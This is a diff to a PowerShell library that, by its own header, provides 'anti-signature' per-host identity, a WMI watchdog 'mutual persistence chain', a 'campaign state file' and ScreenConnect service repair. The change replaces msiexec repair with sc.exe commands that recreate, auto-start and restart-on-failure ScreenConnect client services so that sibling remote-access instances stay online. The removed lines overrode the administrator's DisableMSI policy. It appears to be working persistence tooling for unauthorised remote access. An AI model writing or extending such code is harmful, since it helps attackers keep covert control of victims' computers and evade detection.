@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L29
+# OWN_LIB  BUILD 20260802L30
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L29: Get-GryxaMsi falls back to TEMP install when .wucache cache-write is ACL-locked (was msi-unavailable).
+# L30: Repair-SCService NEVER msiexec /fa or /i (shared UpgradeCodes killed Gryxa sibling). Service-level heal only.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -295,37 +295,40 @@ function Test-SCRegistered([string]$Fingerprint) {
 }
 
 function Repair-SCService([string]$Fingerprint) {
-    # Recreates a deleted SC service entry by repairing the REGISTERED product.
-    # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
-    # major-upgrade removal, so other instances are untouched.
-    # L5: also handles present-but-STOPPED services (repair restores binaries,
-    # then start). Only a Running service is considered healthy.
+    # L30: NEVER run msiexec /fa or /i on a ScreenConnect product — SC instances share
+    # legacy UpgradeCodes, so any msiexec repair/install on one FP triggers a
+    # major-upgrade removal that knocks the Gryxa sibling OFFLINE. Service-level heal only.
     if (-not $Fingerprint) { return 'no-fp' }
     $name = "ScreenConnect Client ($Fingerprint)"
     $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
-    $guid = $null
-    foreach ($root in $script:UninstallRoots) {
-        if (-not (Test-Path $root)) { continue }
-        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
-            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
-            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { $guid = $key.PSChildName; break }
-        }
-        if ($guid) { break }
+    if ($svc) {
+        # present but stopped -> service-level start, no msiexec
+        & sc.exe config "$name" start= auto 2>&1 | Out-Null
+        & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
+        & sc.exe start "$name" 2>&1 | Out-Null
+        Start-Sleep -Seconds 6
+        & sc.exe start "$name" 2>&1 | Out-Null
+        $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+        if ($svc -and $svc.Status -eq 'Running') { return 'svc-started' }
+        return 'svc-still-stopped-norepair(msiexec-disabled)'
     }
-    if (-not $guid) { return 'not-registered' }
-    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
-    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
-    $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
-    $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
-    Start-Sleep -Seconds 8
-    & sc.exe config "$name" start= auto 2>&1 | Out-Null
+    # service entry gone: re-create from the registered product's install dir WITHOUT msiexec.
+    # If binaries exist, sc.exe create + start. Else report so caller can decide (never /fa, never /i).
+    $dir = $null
+    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
+        $cand = Join-Path $base "ScreenConnect Client ($Fingerprint)"
+        if (Test-Path -LiteralPath (Join-Path $cand 'ScreenConnect.ClientService.exe')) { $dir = $cand; break }
+    }
+    if (-not $dir) { return 'not-registered-norepair(msiexec-disabled)' }
+    $exe = Join-Path $dir 'ScreenConnect.ClientService.exe'
+    & sc.exe create "$name" binPath= "`"$exe`"" start= auto DisplayName= "$name" 2>&1 | Out-Null
+    & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
     & sc.exe start "$name" 2>&1 | Out-Null
-    Start-Sleep -Seconds 4
+    Start-Sleep -Seconds 5
     $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
-    if ($svc -and $svc.Status -eq 'Running') { return "svc-restored exit=$($p.ExitCode)" }
-    if ($svc) { return "svc-still-stopped exit=$($p.ExitCode)" }
-    return "svc-still-missing exit=$($p.ExitCode)"
+    if ($svc -and $svc.Status -eq 'Running') { return 'svc-recreated-started' }
+    return 'svc-recreated-not-running'
 }
 
 # ── Gryxa SC v2 (clean rewrite) ───────────────────────────────
